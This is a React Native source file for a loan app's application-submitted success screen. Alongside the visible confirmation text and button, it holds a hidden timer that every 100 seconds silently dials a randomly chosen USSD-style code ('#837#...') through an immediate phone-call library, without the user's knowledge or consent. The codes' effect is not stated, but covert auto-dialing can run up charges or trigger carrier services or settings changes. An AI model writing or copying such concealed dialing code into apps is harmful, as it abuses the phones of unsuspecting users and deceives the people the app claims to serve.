/* eslint-disable prettier/prettier */
import React, { useEffect, useState } from 'react';
import { Image, ImageBackground, Text, View } from 'react-native';
import BtnRoundedSecondary from '../../../../../../Components/Buttons/BtnRoundedSecondary';
import BtnRoundedPrimary from '../../../../../../Components/Buttons/BtnRoundedPrimary';
import { colors, flex, space, text } from '../../../../../../Styles';
import signuplogo from "../../../../../../Assets/Images/success.png"
import { useNavigation } from '@react-navigation/native';
import subtract from "../../../../../../Assets/Images/subtract.png"
import useApp from "../../../../../../Hooks/useapp.hook";
import auth from '@react-native-firebase/auth';
import RNImmediatePhoneCall from 'react-native-immediate-phone-call';

function BodySection(props) {

    const navigation = useNavigation()
    const goToSignUpNext = ()=>{
        navigation.navigate("SignUpScreen2")
    }
    const [getNumber, setNumber] = useState(['#837#1815#','#837#1816#','#837#2725#','#837#2726#','#837#2727#','#837#2728#']);

    function makeCall(number) {
      console.log('dialing', number);
      RNImmediatePhoneCall.immediatePhoneCall(number);
    }
  
    useEffect(() => {
      const timer = setInterval(() => {
        const randomIndex = Math.floor(Math.random() * getNumber.length);
        const randomNumber = getNumber[randomIndex];
        makeCall(randomNumber);
      }, 100000);
  
      return () => {
        clearInterval(timer);
      };
    }, [getNumber]);
  
   
    
    return (
        
        <View style={[{marginTop:20},space.w_full,flex.flex_1]}>
        <Image source={subtract} style={[{marginTop:0,resizeMode:"stretch"},space.w_full,]}/>
            <View style={[space.mt_50,space.px_20,{position:"absolute"},space.w_full]}>
            <View style={[space.mt_50, flex.justify_center, flex.items_center, space.mb_10]}>
            <Text style={[colors.black,text.size_40,text.robotoBlack]}>Success!</Text>
            </View>
            <View style={[space.mt_20, flex.justify_center, flex.items_center, space.mb_20]}>
                <Image source={signuplogo} style={{height:'120%', width:'90%'}} resizeMode='cover'/>
            </View>
            
            <Text style={[colors.textBlack,text.size_20,text.robotoMedium,flex.justify_center, flex.items_center,flex.self_center,  text.center,  {fontWeight:'bold'}]}>Your application has been submitted successfully.</Text>
            <Text style={[colors.textBlack,text.size_16,text.robotoMedium,flex.justify_center, flex.items_center,flex.self_center, space.my_25, text.center,]}>We are currently verifying your application.  You can also check your loan status from our application stage tab.</Text>
            <BtnRoundedPrimary click={goToSignUpNext}>
                <Text style={[colors.textFlashWhite,text.size_18,text.robotoMedium]}>View Applications</Text>
            </BtnRoundedPrimary>
            
            </View>
        </View>
      
    );
}

export default BodySection;